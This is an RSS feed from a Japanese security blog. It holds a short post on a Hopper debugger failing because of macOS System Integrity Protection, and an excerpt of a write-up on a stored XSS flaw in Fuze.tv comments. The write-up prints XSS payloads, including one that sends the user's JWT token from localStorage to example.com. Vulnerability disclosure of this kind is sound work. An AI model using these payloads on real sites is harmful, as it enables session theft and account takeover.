<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>セキュリティ on 水の飲み方を忘れないための備忘録</title>
    <link>https://blog.m0n4.com/categories/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/</link>
    <description>Recent content in セキュリティ on 水の飲み方を忘れないための備忘録</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>ja-jp</language>
    <lastBuildDate>Thu, 10 Feb 2022 20:38:45 +0900</lastBuildDate><atom:link href="https://blog.m0n4.com/categories/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Hopperで特定のアプリケーションをデバッグできなかった話</title>
      <link>https://blog.m0n4.com/post/hopper-undebugable-application/</link>
      <pubDate>Thu, 10 Feb 2022 20:38:45 +0900</pubDate>
      
      <guid>https://blog.m0n4.com/post/hopper-undebugable-application/</guid>
      <description>前置き あ、どうも暇人です。最近はWordleがアツいですね、世界大会出場を目指していきたいと思います。
さて、長らくマルウェアの解析等にIDA無料版やGhidraを使ってきたのですが、今回はMacBook Proを購入したということもあり、
どうせならと以前から気になっていたHopperappを使ってみることにしました。
原因不明…ってコト！？ しばらく使っているうちに、デバッガーがエントリーポイントを読み込んだ直後に停止してしまう問題に直面しました。
類似したケースも見つからずに困っていたところ、IDAの記事にそれらしきものが書かれていたので試してみることに。
 Despite the fact that mac_server64 is codesigned, it still failed to retrieve permission from the OS to debug the target app.
This is because Calculator.app and all other apps in /System/Applications/ are protected by System Integrity Protection and they cannot be debugged until SIP is disabled.
Note that the error message is a bit misleading because it implies that running mac_server64 as root will resolve the issue - it will not.</description>
    </item>
    
    <item>
      <title>Fuze.tvに脆弱性を見つけた話</title>
      <link>https://blog.m0n4.com/post/fuze.tv-high-impact-xss/</link>
      <pubDate>Wed, 28 Jul 2021 18:11:51 +0900</pubDate>
      
      <guid>https://blog.m0n4.com/post/fuze.tv-high-impact-xss/</guid>
      <description>TL;DR Fuze.tv のコメントに蓄積型 XSS を投稿することが可能であり、
下記の方法から Fuze.tv を利用する約 55 万人1すべてのユーザーに影響を及ぼすことが可能だった。
またJWT の実装不備もあり、結果的に完全なサービス妨害に繋げることができた。
Fuze.tv とは ゲームのクリップを共有するサイト。
クライアントは Overwolf に依存。
調査理由 友達が使っていて面白そうだと思ったので、バグがないか探してみることにした。
初期調査 コメントに XSS が投稿できないか WAF を調べてみる。
すると&amp;lt;script&amp;gt;は削除されてしまい、また http/https や href の文字 が &amp;lt;a href&amp;gt; タグ に変換されることが分かった。
次に html タグが埋め込めないか確認したところ XSS が発火。
このときはまだ限定的な条件下での攻撃と考えていた。
&amp;lt;XSS onpointerup=&amp;#34;alert(1)&amp;#34;&amp;lt;h1&amp;gt;XSS&amp;lt;/h1&amp;gt;&amp;lt;/XSS&amp;gt; &amp;lt;div class=&amp;#34;comments-content&amp;#34;&amp;gt; &amp;lt;div compile-content-parser=&amp;#34;::$ctrl.item.message&amp;#34;&amp;gt; &amp;lt;vuln onpointerup=&amp;#34;var i=new Image;i.src=&amp;#34;http://example.com/?&amp;#34;+123;&amp;#34; class=&amp;#34;ng-scope&amp;#34;&amp;gt;&amp;lt;h1&amp;gt;Crafted comment&amp;lt;/h1&amp;gt; &amp;lt;/vuln&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;video&amp;gt; &amp;lt;source onerror=location=/\example.com/+localStorage.getItem(&amp;#34;jwt_token&amp;#34;)&amp;gt; &amp;lt;/video&amp;gt; Iframe を使った XSS Content-Security-Policy が設定されておらず、 Iframe から XSS を入力することができた。</description>
    </item>
    
  </channel>
</rss>
